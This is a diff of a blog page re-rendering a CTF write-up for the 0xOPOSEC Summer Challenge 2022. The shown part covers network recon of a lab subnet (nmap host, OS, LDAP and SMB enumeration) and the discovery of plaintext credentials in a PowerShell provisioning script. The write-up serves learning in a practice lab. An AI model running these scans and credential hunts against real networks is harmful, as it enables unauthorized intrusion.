@@ -1,170 +1,339 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="en"
+  x-data
+  :class="$store.darkMode.class()"
+  :data-theme="$store.darkMode.theme()">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xOPOSEC Summer Challenge 2022 | Bruno Blog</title>
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
-<title>0xOPOSEC Summer Challenge 2022 | Bruno Blog</title>
-<meta name="keywords" content="CTF">
-<meta name="description" content="&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;
-Index
-
-Larapios Group Access {RECON}
-Spread Your Hacks {RECON}
-Big Dollar Spender {WINDOWS}
-Other Os Are People 2 {RECON}
-CAPtain Pwn! {LINUX}
-SO Cute! {LINUX}
-Stairway To Heaven {WINDOWS}
-Conclusion
-
-
-First recon
-Larapios Group Access
-&ldquo;Larapios Group states that they access to our core infrastructure!
-They claim that our security is lacking and have credentials to access our systems.
-Quickly, grab the access and gain access to one of the internal machines!&rdquo;">
-<meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/posts/2022-08-21-0xoposec/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/2022-08-21-0xoposec/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript>
-</head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Bruno Blog (Alt + H)">Bruno Blog</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
-                    <span>Posts</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
-                    <span>Tags</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
-                    <span>Search</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/about/" title="About">
-                    <span>About</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
     
-    <h1 class="post-title entry-hint-parent">
-      0xOPOSEC Summer Challenge 2022
-    </h1>
-    <div class="post-meta"><span title='2022-08-21 00:00:00 +0000 UTC'>August 21, 2022</span>&nbsp;·&nbsp;10 min
+  
+    <link href="/favicon.ico" rel="icon" type="image/x-icon" />
+  
 
+
+<link rel="canonical" href="http://localhost:1313/posts/2022-08-21-0xoposec/" />
+
+
+
+<meta name="author" content="" />
+<meta name="description" content="&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;
+First recon Larapios Group Access &ldquo;Larapios Group states that they access to our core infrastructure! They claim that our security is lacking and have credentials to access our systems. Quickly, grab the access and gain access to one of the internal machines!&rdquo;
+" />
+
+
+<meta name="keywords" content="CTF">
+
+
+
+<meta name="generator" content="Hugo 0.147.0">
+
+
+<meta property="og:url" content="http://localhost:1313/posts/2022-08-21-0xoposec/">
+  <meta property="og:site_name" content="Bruno Blog">
+  <meta property="og:title" content="0xOPOSEC Summer Challenge 2022">
+  <meta property="og:description" content="“Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.”
+First recon Larapios Group Access “Larapios Group states that they access to our core infrastructure! They claim that our security is lacking and have credentials to access our systems. Quickly, grab the access and gain access to one of the internal machines!”">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-08-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-08-21T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0xOPOSEC Summer Challenge 2022">
+  <meta name="twitter:description" content="“Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.”
+First recon Larapios Group Access “Larapios Group states that they access to our core infrastructure! They claim that our security is lacking and have credentials to access our systems. Quickly, grab the access and gain access to one of the internal machines!”">
+
+
+
+
+<link rel="stylesheet" href="/css/output.css" />
+
+
+
+
+    
+
+
+<style>
+  pre {
+    padding: 1em;
+    overflow: auto;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+    
+
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js" integrity="sha256-PtHu0lJIiSHfZeNj1nFd6wTX+Squ255SGZ/fc8seCtM=" crossorigin="anonymous"></script>
+  </head>
+
+  <body x-data="{
+    flip: false,
+  }">
+    
+    <div id="dream-global-bg"></div>
+
+    
+<nav x-data="{ isSticky: false }"
+  x-init="window.addEventListener('scroll', () => { isSticky = window.scrollY > 30 })"
+  class="sticky top-0 z-30 mt-4 lg:mt-8 py-4"
+  :class="{ 'bg-base-100 shadow-lg dark:border-b dark:border-base-content/30': isSticky }">
+
+  
+  <div class="container flex justify-between max-w-[65ch] mx-auto px-4 md:px-0">
+  
+    <section class="flex items-center gap-4">
+      <div class="avatar cursor-pointer hover:avatar-online" @click="flip = !flip" title="Flip it!">
+        <div class="h-10 rounded-full">
+          <img src="/favicon.ico" alt="Bruno Blog" />
+        </div>
+      </div>
+
+      
+      <div>
+        
+        <a href="http://localhost:1313/" class="text-lg font-semibold cursor-pointer">
+          Bruno Blog
+        </a>
+        
+        
+      </div>
+      
+    </section>
+
+    
+    
+
+    <div class="dropdown dropdown-end sm:hidden">
+      <div tabindex="0" role="button" class="btn btn-ghost btn-square" aria-label="Select an option">
+        <ion-icon name="menu" class="text-2xl"></ion-icon>
+      </div>
+      <ul tabindex="0" class="dropdown-content menu w-36 bg-base-100 rounded-box z-1 shadow-md">
+        
+
+
+
+
+
+
+
+<li>
+  <div role="link" tabindex="0" class="inline-flex items-center p-2 cursor-pointer" @click="flip = !flip" title="About">
+    <ion-icon name="information-circle"></ion-icon>About</div>
+</li>
+
+
+
+
+
+
+
+<li>
+  <a class="group inline-flex items-center p-2 cursor-pointer" href="/search" title="Search">
+    <ion-icon name="search"></ion-icon>
+    Search
+  </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/posts" title="Archives">
+    <ion-icon name="archive"></ion-icon>
+    Archives
+  </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/tags" title="All Tags">
+    <ion-icon name="pricetags"></ion-icon>
+    All Tags
+  </a>
+</li>
+
+
+
+
+
+
+      </ul>
+    </div>
+    <section class="hidden sm:flex sm:items-center sm:gap-2 md:gap-4">
+      
+
+      
+      
+
+
+
+
+<div role="link" tabindex="0" class="text-sm font-semibold cursor-pointer hover:underline" @click="flip = !flip" title="About">About</div>
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/search" title="Search">
+  <ion-icon class="group-hover:text-primary-content" name="search"></ion-icon>
+</a>
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/posts" title="Archives">
+  <ion-icon class="group-hover:text-primary-content" name="archive"></ion-icon>
+</a>
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/tags" title="All Tags">
+  <ion-icon class="group-hover:text-primary-content" name="pricetags"></ion-icon>
+</a>
+
+
+      
+
+      
+
+      
+    </section>
+  </div>
+</nav>
+
+
+    <div class="flip-container" :class="{ 'flip-it': flip }">
+      <div class="flipper">
+        <div class="front">
+          <div class="container">
+            
+<div class="lg:grid lg:grid-cols-4 gap-4 mt-4 px-4">
+  <div class="hidden lg:block">
+    
+  </div>
+
+  <div class="lg:col-span-2">
+    <article class="mx-auto prose prose-quoteless dark:prose-invert" id="dream-single-post-main" itemscope itemtype="http://schema.org/Article">
+      
+  <meta itemprop="name" content="0xOPOSEC Summer Challenge 2022">
+  <meta itemprop="description" content="“Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.”
+First recon Larapios Group Access “Larapios Group states that they access to our core infrastructure! They claim that our security is lacking and have credentials to access our systems. Quickly, grab the access and gain access to one of the internal machines!”">
+  <meta itemprop="datePublished" content="2022-08-21T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2022-08-21T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1960">
+  <meta itemprop="keywords" content="CTF">
+
+      <header>
+        <h1 itemprop="headline">0xOPOSEC Summer Challenge 2022</h1>
+        <p class="text-sm">
+          
+            Sunday, Aug 21, 2022
+          
+
+          | <span>10 minute read</span>
+
+          
+          | <span>Updated at
+            
+              Sunday, Aug 21, 2022
+            </span>
+          
+        </p>
+
+        
+        <div class="flex justify-between">
+          
+
+          <div class="flex items-center gap-2">
+  
+  
+
+  
+  
+  
+  
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://x.com/intent/post?text=0xOPOSEC%20Summer%20Challenge%202022&amp;url=http://localhost:1313/posts/2022-08-21-0xoposec/" target="_blank" rel="noopener noreferrer"
+      title="Share on X">
+      <ion-icon class="group-hover:text-primary-content" name="logo-x"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/2022-08-21-0xoposec/" target="_blank" rel="noopener noreferrer"
+      title="Share on Facebook">
+      <ion-icon class="group-hover:text-primary-content" name="logo-facebook"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://wa.me/?text=0xOPOSEC%20Summer%20Challenge%202022%20http://localhost:1313/posts/2022-08-21-0xoposec/" target="_blank" rel="noopener noreferrer"
+      title="Share on WhatsApp">
+      <ion-icon class="group-hover:text-primary-content" name="logo-whatsapp"></ion-icon>
+    </a>
+  
+
+  
+  
 </div>
-  </header> 
-  <div class="post-content"><p>&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;</p>
-<h2 id="index">Index<a hidden class="anchor" aria-hidden="true" href="#index">#</a></h2>
-<ul>
-<li><a href="#first-recon">Larapios Group Access {RECON}</a></li>
-<li><a href="#second-recon">Spread Your Hacks {RECON}</a></li>
-<li><a href="#first-windows-priv-esc">Big Dollar Spender {WINDOWS}</a></li>
-<li><a href="#third-recon">Other Os Are People 2 {RECON}</a></li>
-<li><a href="#first-linux-priv-esc">CAPtain Pwn! {LINUX}</a></li>
-<li><a href="#second-linux-priv-esc">SO Cute! {LINUX}</a></li>
-<li><a href="#second-windows-priv-esc">Stairway To Heaven {WINDOWS}</a></li>
-<li><a href="#conclusion">Conclusion</a></li>
-</ul>
-<br>
-<h2 id="first-recon">First recon<a hidden class="anchor" aria-hidden="true" href="#first-recon">#</a></h2>
-<h3 id="larapios-group-access">Larapios Group Access<a hidden class="anchor" aria-hidden="true" href="#larapios-group-access">#</a></h3>
+
+        </div>
+      </header>
+
+      <section id="dream-single-post-content" itemprop="articleBody">
+        
+
+        <p>&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;</p>
+<h2 id="first-recon">First recon</h2>
+<h3 id="larapios-group-access">Larapios Group Access</h3>
 <p><em>&ldquo;Larapios Group states that they access to our core infrastructure!
 They claim that our security is lacking and have credentials to access our systems.
 Quickly, grab the access and gain access to one of the internal machines!&rdquo;</em></p>
@@ -172,21 +341,21 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 <ul>
 <li>First thing I did was to find all the up hosts and then find more info about those and for that I used nmap</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sn 192.168.111.0/24
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sn 192.168.111.0/24
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.26
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.30
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.31
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.34
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.36
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.41
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.42
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.26
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.30
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.31
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.34
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.36
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.41
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.42
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$  nmap -O 192.168.111.0/24
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.26
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.035s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">988</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.26
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">988</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>53/tcp   open  domain
 </span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
@@ -197,52 +366,52 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
 </span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
 </span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
-</span></span><span style="display:flex;"><span>3268/tcp open  	<span style="color:#586e75">`</span>
+</span></span><span style="display:flex;"><span>3268/tcp open  	<span style="color:#e6db74">`</span>
 </span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
 </span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.30
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.050s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.30
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.050s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>135/tcp  open  msrpc
 </span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
 </span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
 </span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.31
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.14s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">999</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.31
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE
 </span></span><span style="display:flex;"><span>22/tcp open  ssh
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.34
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.13s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">999</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.34
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE
 </span></span><span style="display:flex;"><span>22/tcp open  ssh
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.36
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.14s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.36
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>135/tcp  open  msrpc
 </span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
 </span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
 </span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.41
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.049s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.41
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.049s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>135/tcp  open  msrpc
 </span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
 </span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
 </span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> 192.168.111.42
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.15s latency<span style="color:#719e07">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#2aa198">996</span> closed tcp ports <span style="color:#719e07">(</span>reset<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.111.42
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>135/tcp  open  msrpc
 </span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
@@ -251,7 +420,7 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span></code></pre></div><ul>
 <li>Since this returned so much info I grouped everything by Windows and Linux machines by using the TTL when pinging and got the following</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.111.26:Windows
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.111.26:Windows
 </span></span><span style="display:flex;"><span>192.168.111.30:Windows
 </span></span><span style="display:flex;"><span>192.168.111.31:Linux
 </span></span><span style="display:flex;"><span>192.168.111.34:Linux
@@ -261,8 +430,8 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </span></span></code></pre></div><ul>
 <li>Grabing the first machine (Windows) I wanted to enumerate more and since this is most likely using Windows AD why not enumerate for LDAP? After enumerating I got the respective domain <code>bajordas.local</code> and the DC</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -n -sV --script <span style="color:#2aa198">&#34;ldap* and not brute&#34;</span> 192.168.111.26
-</span></span><span style="display:flex;"><span>ldapServiceName: bajordas.local:win-dc01<span style="color:#268bd2">$@</span>BAJORDAS.LOCAL
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -n -sV --script <span style="color:#e6db74">&#34;ldap* and not brute&#34;</span> 192.168.111.26
+</span></span><span style="display:flex;"><span>ldapServiceName: bajordas.local:win-dc01$@BAJORDAS.LOCAL
 </span></span></code></pre></div><ul>
 <li>Next thing I did was to enumerate all Windows machines for RDP since its a common service used by Windows and doing this got a lot more info like machine names and some juicy info</li>
 </ul>
@@ -288,32 +457,32 @@ Quickly, grab the access and gain access to one of the internal machines!&rdquo;
 </code></pre><ul>
 <li>Next, but still in the enumeration process I enumerated smb and found powershell scripts on <code>.30</code> machine</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 192.168.111.30
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 192.168.111.30
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>users1.ps1
 </span></span><span style="display:flex;"><span>provisionUsers.ps1
 </span></span></code></pre></div><ul>
 <li>provisionUsers.ps1 had creds for sedalfino</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#268bd2">net</span> <span style="color:#268bd2">user</span> <span style="color:#268bd2">sedalfino.freitas</span> <span style="color:#268bd2">Summer2022</span> <span style="color:#268bd2">/add</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">net</span> <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">sedalfino.freitas</span> <span style="color:#a6e22e">Summer2022</span> /add
 </span></span></code></pre></div><ul>
 <li>users1.ps1 was a golden mine with more user creds</li>
 </ul>
